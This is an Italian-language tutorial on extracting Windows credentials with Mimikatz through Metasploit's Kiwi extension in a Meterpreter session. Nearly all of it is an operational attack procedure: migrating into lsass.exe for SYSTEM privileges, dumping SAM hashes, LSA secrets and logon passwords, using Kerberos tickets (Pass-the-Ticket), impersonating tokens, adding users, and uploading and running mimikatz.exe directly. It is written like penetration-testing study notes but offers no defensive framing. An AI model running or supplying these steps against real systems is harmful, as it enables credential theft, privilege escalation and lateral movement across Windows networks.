# Dumping Hashes con Mimikatz (via Kiwi Extension)

**Mimikatz** è un potente tool di post-exploitation scritto da Benjamin Delpy (`@gentilkiwi`) che consente di estrarre password in chiaro, hash, ticket Kerberos e altre credenziali dalla memoria di un sistema Windows. <br>
Una delle sue integrazioni più comode è attraverso **Metasploit**, grazie all’estensione `kiwi`.

Questa estensione permette di usare diverse funzioni di mimikatz direttamente da una sessione Meterpreter, evitando l’upload manuale del binario.

---

## 1 – Prerequisiti

Per funzionare correttamente, Mimikatz (e quindi `kiwi`) ha bisogno di **privilegi SYSTEM**, poiché il processo `lsass.exe` è protetto da Windows. Dopo aver ottenuto una shell su un target, assicurati di essere in un contesto privilegiato.

`pgrep lsass` individua il PID del processo lsass.exe <br>
`migrate <PID>` migra la sessione Meterpreter in lsass.exe <br>
`getuid ` verifica che stai operando come NT AUTHORITY\SYSTEM <br>


---

## 2 – Caricamento dell’estensione Kiwi

Carica l’estensione con:

`load kiwi` carica le funzioni mimikatz integrate in Meterpreter <br>

Per visualizzare tutti i comandi disponibili usa `?` oppure `help`

---

## 3 – Comandi principali dell’estensione Kiwi
```bash
creds_all                  # Estrae tutte le credenziali dalla memoria
creds_domain               # Estrae solo le credenziali del dominio
creds_msv                  # Estrae le credenziali MSV1_0 (locali)
creds_ssp                  # Estrae le credenziali SSP
creds_tspkg                # Estrae le credenziali TSPKG
creds_wdigest              # Estrae le credenziali in chiaro da WDIGEST (se abilitato)
creds_kerberos             # Estrae ticket Kerberos attivi
kerberos_ticket_use        # Usa un ticket Kerberos esistente (Pass-the-Ticket)
kerberos_ticket_list       # Mostra tutti i ticket Kerberos caricati
kerberos_ticket_purge      # Rimuove tutti i ticket
lsa_dump_sam               # Dump del database SAM, SysKey e hash
lsa_dump_secrets           # Estrae segreti e credenziali dalla memoria LSA
misc_add_user              # Crea un nuovo utente nel sistema
misc_cmd                   # Esegue un comando mimikatz personalizzato
ps                         # Lista dei processi
rev2self                   # Rimuove l’impersonificazione utente
sekurlsa_logonpasswords    # Visualizza le credenziali delle sessioni logon
token_list                 # Mostra i token utente disponibili
token_impersonate          # Impersona un token selezionato
ticket_purge               # Rimuove tutti i ticket Kerberos
```
## 4 – Dumping con Kiwi

Comandi pratici:

`creds_all` raccoglie tutte le credenziali disponibili <br>
`lsa_dump_sam` dump del Security Account Manager (SAM) locale <br>
`lsa_dump_secrets` estrae segreti memorizzati in LSA <br>
`sekurlsa_logonpasswords` credenziali logon in memoria (se visibili) <br>

---

## 5 – Uso classico di Mimikatz su shell

É possibile caricare direttamente il binario di mimikatz sul target usando l'upload:

`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` carica mimikatz <br>
`shell` accedi a una shell <br>
`.\mimikatz.exe` esegui mimikatz <br>


Comandi classici:

`privilege::debug` verifica i privilegi <br>
`lsadump::sam` dump SAM (hash + chiavi) <br>
`lsadump::secrets` dump dei segreti <br>
`sekurlsa::logonpasswords` credenziali salvate in memoria <br>
